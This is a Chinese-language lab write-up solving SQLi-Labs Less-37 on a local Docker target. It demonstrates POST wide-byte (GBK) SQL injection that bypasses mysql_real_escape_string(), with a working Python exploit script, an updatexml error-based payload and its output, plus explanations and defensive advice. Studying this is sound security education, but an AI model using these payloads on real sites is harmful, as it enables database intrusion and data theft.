SQLi-Labs Less-37

2026年9月29日 SQLi-Labs Web安全 SQL注入 POST宽字节注入

一、题目信息

  • 题目名称：SQLi-Labs Less-37 (POST - Bypass MySQL_real_escape_string)
  • 题目平台：SQLi-Labs 本地靶场（Docker 环境）
  • 题目类型：Web安全 / SQL注入 / POST型宽字节注入 / 高级转义绕过
  • 靶场链接：http://localhost:8081/Less-37/（本地环境）
  • 涉及工具：Python (requests库)

二、解题步骤

1. 分析题目考什么

本题的核心考点是POST 型宽字节注入绕过 mysql_real_escape_string() 函数。Less-37 是 Less-36 的 POST 变体，注入点在登录表单的 uname 字段。后端使用 mysql_real_escape_string() 转义单引号，但可以通过在单引号前插入 %df，利用 GBK 编码将 %df%5c 组合成汉字，从而吃掉反斜杠，让单引号逃逸。

2. 怎么想（破题思路）

  • 直接提交 admin'，页面没有报错，说明被转义。
  • 由于是 POST 请求，无法直接在地址栏注入，必须借助 Python 脚本或 Burp Suite。
  • 构造宽字节 Payload：1%df' and updatexml(...)-- 。
  • 使用 Python 脚本发送 POST 请求，注意避免 requests 库对 %df 进行双重 URL 编码。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Python requests 库自动编码 %df

踩坑情况：直接使用 requests.post(url, data={'uname': "1%df'..."})，发现注入失败。

原因分析：requests 库会将字典中的 % 自动转义为 %25，导致 %df 变成 %25df，破坏了宽字节结构。

改进方式：不要使用字典，直接拼接成原始字符串：data="uname=1%df'..."，并手动设置 Content-Type: application/x-www-form-urlencoded。

详细实操步骤（Payload逐字解释）

第一步：编写 Python 脚本

import requests

url = "http://localhost:8081/Less-37/"
raw_data = "uname=1%df' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- &passwd=123&submit=Submit"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

response = requests.post(url, data=raw_data, headers=headers)
print(response.text)

第二步：Payload 逐字解析

  • 1%df'：核心宽字节 Payload。%df 和转义后的 %5c 合成汉字，单引号逃逸。
  • and updatexml(...)：报错注入，获取当前数据库名。
  • -- ：注释符，阻止后续密码验证逻辑。

第三步：验证结果

终端输出 XPATH syntax error: '~security~'，注入成功。

4. 怎么迁移（跨领域联想）

  • 字符集与编码安全：宽字节注入的根源是“字符集不一致”。当 PHP 和 MySQL 连接使用了 GBK 编码时，单字节转义就会被多字节解析“吃掉”。
  • POST 注入与自动化：真实渗透中，POST 表单必须依赖脚本或抓包工具。掌握 Python requests 库能极大提高测试效率。
  • 安全开发启示：使用参数化查询（Prepared Statements）是防御 SQL 注入的唯一终极方案。

三、名词大全与原理深度复盘

1. 宽字节注入 (Broad Byte Injection)

利用数据库字符集（如 GBK）将两个单字节“拼”成一个多字节汉字的特性，让转义符 \（%5c）被吃掉，从而让后续的危险字符逃逸。

2. mysql_real_escape_string() 函数

PHP 中用于转义 SQL 语句中特殊字符的函数。它会根据当前连接的字符集来转义，但如果连接字符集设置不当（如未设置 GBK），仍会被宽字节注入绕过。

3. POST 注入

数据通过 HTTP 请求体提交。与 GET 注入不同，POST 注入无法直接在 URL 修改，必须使用抓包工具或脚本。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-36 的区别：Less-36 是 GET 请求宽字节注入，Less-37 是 POST 请求宽字节注入。原理完全一致，只是提交方式不同。
  • 与 Less-34 的区别：Less-34 使用的是 addslashes()，Less-37 使用的是 mysql_real_escape_string()，两者均被宽字节绕过。

2. 这种题目的出现原因（为什么存在）

开发者知道要用 addslashes() 或 mysql_real_escape_string() 防御 SQL 注入，但忽略了数据库字符集的特性。当 PHP 和 MySQL 连接使用了 GBK 编码时，单字节转义就会被多字节解析“吃掉”。这反映了“安全防御不能只看代码层，还要看底层配置”的问题。

3. 这种应用在实际中如何体现？

在实战中，宽字节注入常见于使用 GBK 编码的国产 CMS（如 DedeCMS、Discuz）中。防御方必须统一使用 UTF-8 编码，或者强制使用参数化查询。

4. 如何抽象理解概念（大白话）

把靶场比作一个“检查站”：

  • 安检员（mysql_real_escape_string）看到单引号（炸弹），会在前面加一个锁（反斜杠 \）。
  • 但你把炸弹写成了“%df'”。
  • 安检员加锁后变成“%df\ '”。
  • 但翻译官（GBK 解码）看到“%df\”，以为它们是一个汉字，直接把锁吃掉了。于是炸弹又漏了出来。
